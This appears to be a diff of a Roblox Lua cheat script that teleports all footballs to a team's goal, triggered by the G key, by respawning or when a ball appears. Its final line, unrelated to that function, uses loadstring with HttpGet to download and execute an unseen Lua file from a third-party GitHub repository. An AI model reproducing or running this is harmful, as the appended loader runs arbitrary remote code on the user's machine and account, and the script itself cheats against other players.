@@ -6,7 +6,7 @@ local UserInputService = game:GetService("UserInputService")
 
 local Player = Players.LocalPlayer
 
--- Function to safely find all footballs in the Junk folder
+-- Function to find all footballs in the Junk folder
 local function findBalls()
     local junkFolder = Workspace:FindFirstChild("Junk")
     local balls = {}
@@ -17,23 +17,21 @@ local function findBalls()
             end
         end
     else
-        print("Junk folder not found!")
+        warn("Junk folder not found!")
     end
     return balls
 end
 
--- Function to teleport all balls to a "very hard" position based on the player's team
+-- Function to teleport all balls to the designated position based on the player's team
 local function teleportAllBalls()
-    local targetPosition = nil
+    local targetPosition
 
-    -- Check player's team and set "very hard" target positions
+    -- Determine the target position based on the player's team
     if Player.Team then
         if Player.Team.Name == "Home" then
-            targetPosition = Vector3.new(2.010676682, 4.00001144, -186.170898)  -- Home team's "very hard" position
-            print("Home")
+            targetPosition = Vector3.new(2.010676682, 4.00001144, -186.170898)
         elseif Player.Team.Name == "Away" then
-            targetPosition = Vector3.new(-0.214612424, 4.00001144, 186.203613)  -- Away team's "very hard" position
-            print("Away")
+            targetPosition = Vector3.new(-0.214612424, 4.00001144, 186.203613)
         end
     end
 
@@ -41,50 +39,30 @@ local function teleportAllBalls()
         local balls = findBalls()
         if #balls > 0 then
             for _, ball in pairs(balls) do
-                -- Safe teleportation with error handling to avoid crashes
                 local success, errorMessage = pcall(function()
-                    ball.CFrame = CFrame.new(targetPosition) -- Teleport the ball to the "very hard" position
+                    ball.CFrame = CFrame.new(targetPosition)
                 end)
-                if success then
-                else
+                if not success then
                     warn("Error teleporting ball: " .. errorMessage)
                 end
             end
         else
-            warn("No ball found ")
+            warn("No balls found!")
         end
     else
-        warn("NONE")
+        warn("No team or target position found!")
     end
 end
 
--- Function to handle reset and player respawn
+-- Handle player reset and respawn
 local function onPlayerRespawned()
-    -- Wait for the character to fully load
     local character = Player.Character or Player.CharacterAdded:Wait()
-    print("Player respawned, waiting for character to load...")
-    
-    -- Wait for necessary parts to load before teleporting
-    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
-
-
-
-    -- Detect when new footballs are added (after player reset)
-    local childAddedConnection
-    childAddedConnection = Workspace.ChildAdded:Connect(function(child)
-        if child:IsA("Part") and child.Name == "Football" then
-        end
-    end)
-
-    -- Disconnect the event when no longer needed (avoids multiple event listeners)
-    -- Ensures the function doesn't stack up event listeners over time
-    wait(1)  -- Give some time to process the respawn and football addition.
-    if childAddedConnection then
-        childAddedConnection:Disconnect()
-    end
+    character:WaitForChild("HumanoidRootPart") -- Ensure the character is fully loaded
+    wait(1) -- Short delay for stability
+    teleportAllBalls() -- Teleport balls after respawn
 end
 
--- Trigger the teleportation when the user presses 'G'
+-- Trigger teleportation when the user presses 'G'
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
     if input.KeyCode == Enum.KeyCode.G then
@@ -93,18 +71,16 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
 end)
 
 -- Connect to the player's respawn event
-Player.CharacterAdded:Connect(function(character)
-    print("Player character  checking respawn...")
-    -- After respawn, call onPlayerRespawned to make sure the balls are in position
-    onPlayerRespawned()
-end)
+Player.CharacterAdded:Connect(onPlayerRespawned)
 
--- Detect ball reset and re-teleport balls if any are added
+-- Detect new footballs being added to the Workspace
 Workspace.ChildAdded:Connect(function(child)
     if child:IsA("Part") and child.Name == "Football" then
-        print("ball added")
+        wait(0.5) -- Small delay for synchronization
+        teleportAllBalls()
     end
 end)
+
 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/NOTHINGx555/load/refs/heads/main/.lua"))()
